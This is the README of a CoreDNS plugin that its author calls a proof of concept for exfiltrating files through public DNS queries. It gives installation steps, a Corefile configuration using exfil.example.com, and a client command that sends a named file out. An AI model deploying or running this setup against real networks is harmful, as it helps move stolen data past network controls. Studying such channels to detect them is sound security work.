# exfiltration plugin for coredns

This plugin is a proof of concept for data exfiltration via public DNS infrastructure.

It works by splitting the file into chunks and sending DNS-Requests for containing the data
encoded into the requested domain names. The encoding is needlessly complex, the requests will
immediatly raise alarm should any human ever look at them.

## Disclaimer and limitations

You should never actually use this. The data is transmitted unencrypted via a chain of public servers,
that are likely to cache part or all of the data.

There is no feedback to the client, the client has no way to know if the file was transferred successfully.
Though I never had a problem, because usually every chunk will be transmitted twice (IPv4 & IPv6).

## Installation

Clone the coredns repository

    git clone https://github.com/coredns/coredns.git

Add the plugin to the `plugin.cfg`, I recommend to put it after the `file:file` line.

    exfil:github.com/jpicht/exfil/lib/exfil

Build and deploy the server. A very basic example client is contained in the cmd/client subdirectory.

## Server configuration

Add the plugin to the Corefile

    exfil.example.com. {
        exfil exfil.example.com. /srv/exfil
    }

The syntax is:

    exfil $DOMAIN $PATH

## Usage

    client <domain> <filename>
